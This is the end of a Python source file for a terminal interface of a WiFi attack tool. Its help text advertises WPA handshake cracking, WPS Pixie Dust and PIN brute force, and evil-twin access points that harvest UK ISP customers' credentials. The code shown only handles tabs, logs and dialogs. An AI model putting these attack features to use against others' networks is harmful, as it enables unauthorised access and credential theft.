  1. Click "🔍 1. SCAN NETWORKS" to discover WiFi networks
  2. Use ↑↓ arrows or mouse to select network from list
  3. Click "📡 2. CAPTURE HANDSHAKE" to capture WPA handshake
  4. Click "🔓 3. CRACK PASSWORD" to crack the password
  5. Or use "🚀 SMART CRACK WORKFLOW" for automated process

[green]UK Router WPS Tab:[/green]
  • Compute PIN: MAC address-based PIN calculation
  • Pixie Dust: Offline WPS vulnerability exploitation
  • PIN Brute Force: Full 8-digit WPS PIN enumeration
  • Advanced WPS: Small DH Key, Registrar Disclosure, EAP Injection

[green]Router Cracking Tab:[/green]
  • Router Hex Mode: 10-digit hex passwords (a-f, 0-9)
  • EE WiFi Mode: 12-14 digit EE/BT Smart Hub patterns
  • Auto Router Detect: SSID analysis for optimal wordlist

[green]Evil Twin Suite Tab:[/green]
  • Create fake access points with captive portals
  • Pre-configured templates for UK ISPs
  • Credential harvesting and logging

[yellow]Pro Tips:[/yellow]
  • Use Tab key to quickly cycle through tabs
  • Networks are sorted by signal strength (best first)
  • WPS attacks work best on routers with WPS enabled
  • Evil Twin requires hostapd, dnsmasq, and iptables
  • For best results, be close to target network
        """
        self.app.push_screen(ModalScreen(Static(help_text, id="help_content"), id="help_screen"))

    def action_quit(self) -> None:
        """Quit the application"""
        self.exit()

    def action_clear_log(self) -> None:
        """Clear log output"""
        try:
            # Try to clear the active tab's log
            tabs = self.query_one("#tabs", TabbedContent)
            active_tab = tabs.active
            if active_tab == "wifi_tab":
                log = self.query_one("#wifi_log", MarkupLog)
                log.clear()
            elif active_tab == "router_tab":
                log = self.query_one("#router_log", MarkupLog)
                log.clear()
            elif active_tab == "intel_tab":
                log = self.query_one("#intel_log", MarkupLog)
                log.clear()
        except:
            pass
    
    def action_save_results(self) -> None:
        """Save current tab's results to file"""
        try:
            from datetime import datetime
            tabs = self.query_one("#tabs", TabbedContent)
            active_tab = tabs.active

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

            if active_tab == "wifi_tab":
                log = self.query_one("#wifi_log", MarkupLog)
                filename = f"wifucker_wifi_{timestamp}.txt"
            elif active_tab == "router_tab":
                log = self.query_one("#router_log", MarkupLog)
                filename = f"wifucker_router_{timestamp}.txt"
            elif active_tab == "intel_tab":
                log = self.query_one("#intel_log", MarkupLog)
                filename = f"wifucker_intel_{timestamp}.txt"
            else:
                return

            # Get log content (textual logs don't have direct content access)
            # We'll save a summary instead
            output_path = ROOT_DIR / filename
            with open(output_path, 'w') as f:
                f.write(f"WIFUCKER Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Tab: {active_tab}\n")
                f.write("=" * 60 + "\n")
                f.write("Note: Full log content requires Textual API enhancement\n")
                f.write("This file was created via Save Results action.\n")

            log.write(f"[green]✓ Results saved to: {output_path}[/]")
        except Exception as e:
            try:
                log = self.query_one("#wifi_log", MarkupLog)
                log.write(f"[red]Error saving results: {e}[/]")
            except:
                pass
    
    def action_next_tab(self) -> None:
        """Navigate to next tab"""
        tabs = self.query_one("#tabs", TabbedContent)
        tab_ids = ["wifi_tab", "intel_tab"]
        current_idx = tab_ids.index(tabs.active) if tabs.active in tab_ids else 0
        next_idx = (current_idx + 1) % len(tab_ids)
        tabs.active = tab_ids[next_idx]

    def action_prev_tab(self) -> None:
        """Navigate to previous tab"""
        tabs = self.query_one("#tabs", TabbedContent)
        tab_ids = ["wifi_tab", "intel_tab"]
        current_idx = tab_ids.index(tabs.active) if tabs.active in tab_ids else 0
        prev_idx = (current_idx - 1) % len(tab_ids)
        tabs.active = tab_ids[prev_idx]

    def action_refresh_data(self) -> None:
        """Refresh data in current tab"""
        try:
            tabs = self.query_one("#tabs", TabbedContent)
            active_tab = tabs.active

            if active_tab == "wifi_tab":
                # Refresh WiFi interface status
                wifi_tab = self.query_one("#wifi_container", WiFiOperationsTab)
                wifi_tab.update_interface_status()
                wifi_tab.query_one("#wifi_log", MarkupLog).write("[cyan]✓ Interface status refreshed[/]")
            elif active_tab == "intel_tab":
                # Refresh intelligence status
                intel_tab = self.query_one("#intel_container", IntelligenceToolsTab)
                intel_tab.refresh_intel_status()
        except Exception as e:
            pass

    def action_select_prev_network(self) -> None:
        """Select previous network in the list"""
        try:
            tabs = self.query_one("#tabs", TabbedContent)
            if tabs.active == "wifi_tab":
                wifi_tab = self.query_one("#wifi_container", WiFiOperationsTab)
                wifi_tab.select_prev_network()
        except:
            pass

    def action_select_next_network(self) -> None:
        """Select next network in the list"""
        try:
            tabs = self.query_one("#tabs", TabbedContent)
            if tabs.active == "wifi_tab":
                wifi_tab = self.query_one("#wifi_container", WiFiOperationsTab)
                wifi_tab.select_next_network()
        except:
            pass

    def action_confirm_network_selection(self) -> None:
        """Confirm current network selection"""
        try:
            tabs = self.query_one("#tabs", TabbedContent)
            if tabs.active == "wifi_tab":
                wifi_tab = self.query_one("#wifi_container", WiFiOperationsTab)
                wifi_tab.confirm_network_selection()
        except:
            pass

    def disable_buttons_during_operation(self, tab_id: str, operation_name: str = "operation") -> list:
        """Disable buttons in a tab during operation to prevent multiple clicks"""
        disabled_buttons = []
        try:
            tab = self.query_one(f"#{tab_id}", Container)
            buttons = tab.query(Button)
            for button in buttons:
                if not button.disabled:
                    button.disabled = True
                    button.label = f"⏳ {button.label}"
                    disabled_buttons.append(button)
        except Exception as e:
            pass  # Don't fail if buttons can't be found
        return disabled_buttons

    def reenable_buttons_after_operation(self, disabled_buttons: list) -> None:
        """Re-enable buttons after operation completes"""
        for button in disabled_buttons:
            try:
                button.disabled = False
                # Remove the loading indicator from label
                if button.label.startswith("⏳ "):
                    button.label = button.label[3:]
            except:
                pass  # Don't fail if button is no longer available

    def show_operation_status(self, tab_id: str, status: str, operation_type: str = "operation") -> None:
        """Show operation status with appropriate indicators"""
        try:
            # Try to find and update progress monitor
            tab = self.query_one(f"#{tab_id}", Container)
            monitors = tab.query("ProgressMonitor")
            if monitors:
                monitors[0].status = status
                monitors[0].refresh()

            # Also show notification for important operations
            if "error" in status.lower() or "failed" in status.lower():
                self.notify(f"{operation_type.title()}: {status}", severity="error", timeout=5)
            elif "complete" in status.lower() or "success" in status.lower():
                self.notify(f"{operation_type.title()}: {status}", severity="information", timeout=3)
            elif "start" in status.lower() or "working" in status.lower():
                self.notify(f"Starting {operation_type}...", severity="warning", timeout=2)

        except Exception as e:
            # Fallback to notification only
            self.notify(f"{operation_type.title()}: {status}", timeout=3)

    def show_user_friendly_error(self, log, error: Exception, context: str = "", suggestions: list = None) -> None:
        """Show user-friendly error messages with actionable suggestions"""
        error_msg = str(error)
        error_type = type(error).__name__

        # Generic error messages with suggestions
        friendly_messages = {
            "FileNotFoundError": "File not found. Please check the path and try again.",
            "PermissionError": "Permission denied. You may need to run with sudo or check file permissions.",
            "ConnectionError": "Network connection failed. Check your internet connection.",
            "TimeoutError": "Operation timed out. Try again or check system resources.",
            "MemoryError": "Not enough memory. Try with smaller datasets or free up system memory.",
            "OSError": "System operation failed. Check system resources and permissions.",
        }

        # Context-specific suggestions
        context_suggestions = {
            "wifi": ["Capture handshake first in WiFi Operations tab", "Check wireless interface is available", "Ensure monitor mode is enabled"],
            "wps": ["Check router supports WPS", "Try different WPS attack methods", "Ensure you're close to the target AP"],
            "evil_twin": ["Check system has hostapd and dnsmasq installed", "Ensure wireless interface supports AP mode", "Run with sudo privileges"],
            "wordlist": ["Check available disk space", "Try smaller wordlist size", "Verify write permissions to output directory"],
        }

        # Get friendly message
        friendly_msg = friendly_messages.get(error_type, f"An error occurred: {error_msg}")

        # Add context-specific suggestions
        if context and context in context_suggestions:
            if not suggestions:
                suggestions = context_suggestions[context]

        # Display error
        log.write(f"[red]❌ Error ({error_type}):[/] {friendly_msg}")

        # Add suggestions if provided
        if suggestions:
            log.write("[yellow]💡 Suggestions:[/]")
            for suggestion in suggestions:
                log.write(f"  • {suggestion}")

        # Add help hint
        log.write("[cyan]ℹ️  Press '?' for help or check the logs for more details[/]")

        # Show notification
        self.notify(f"Error: {friendly_msg[:50]}...", severity="error", timeout=5)

    def on_tabbed_content_tab_activated(self, event: TabbedContent.TabActivated) -> None:
        """Handle tab switches to ensure proper state management"""
        tab_id = event.tab.id

        # Update status for the new active tab
        if tab_id == "wifi_tab":
            self.show_operation_status("wifi_tab", "Ready for WiFi operations", "WiFi")
        elif tab_id == "router_tab":
            self.show_operation_status("router_tab", "Ready for router cracking", "Router")
        elif tab_id == "uk_wps_tab":
            self.show_operation_status("uk_wps_tab", "Ready for WPS attacks", "WPS")
        elif tab_id == "iot_wps_tab":
            self.show_operation_status("iot_wps_tab", "Ready for IoT WPS attacks", "IoT WPS")
        elif tab_id == "evil_twin_tab":
            self.show_operation_status("evil_twin_tab", "Ready for evil twin attacks", "Evil Twin")
        elif tab_id == "intel_tab":
            self.show_operation_status("intel_tab", "Ready for intelligence operations", "Intelligence")

        # Clear any lingering operation states when switching tabs
        self._clear_pending_operations()

    def _clear_pending_operations(self) -> None:
        """Clear any pending operations or temporary states when switching tabs"""
        try:
            # This could be extended to stop background threads, clear temporary files, etc.
            # For now, just ensure all buttons are re-enabled
            tabs = ["wifi_tab", "router_tab", "uk_wps_tab", "iot_wps_tab", "evil_twin_tab", "intel_tab"]
            for tab_id in tabs:
                try:
                    tab = self.query_one(f"#{tab_id}", Container)
                    buttons = tab.query(Button)
                    for button in buttons:
                        if button.disabled and button.label.startswith("⏳ "):
                            button.disabled = False
                            button.label = button.label[3:]  # Remove loading indicator
                except:
                    pass  # Tab might not exist or be accessible
        except:
            pass  # Don't fail on tab cleanup

    async def confirm_destructive_operation(self, operation_name: str, description: str, consequences: list = None) -> bool:
        """Show confirmation dialog for potentially destructive operations"""
        from textual.widgets import Button
        from textual.containers import Vertical

        # Build confirmation message
        message = f"[bold red]⚠️  Confirm {operation_name}[/bold red]\n\n"
        message += f"[white]{description}[/white]\n\n"

        if consequences:
            message += "[yellow]This will:[/yellow]\n"
            for consequence in consequences:
                message += f"  • {consequence}\n"
            message += "\n"

        message += "[cyan]Are you sure you want to proceed?[/cyan]"

        # Create confirmation dialog
        confirmed = False

        def on_yes():
            nonlocal confirmed
            confirmed = True
            self.app.pop_screen()

        def on_no():
            nonlocal confirmed
            confirmed = False
            self.app.pop_screen()

        # Create buttons
        yes_button = Button("✅ Yes, Proceed", variant="error", id="confirm_yes")
        no_button = Button("❌ No, Cancel", variant="primary", id="confirm_no")

        # Create dialog screen
        dialog = ModalScreen(
            Vertical(
                Static(message, id="confirm_message"),
                Horizontal(yes_button, no_button, id="confirm_buttons")
            ),
            id="confirmation_dialog"
        )

        # Show dialog and wait for response
        await self.app.push_screen(dialog)

        # Bind button actions
        yes_button.press = on_yes
        no_button.press = on_no

        return confirmed


def main():
    """Run the TUI"""
    app = WiFuFuckerApp()
    app.run()


if __name__ == "__main__":
    main()
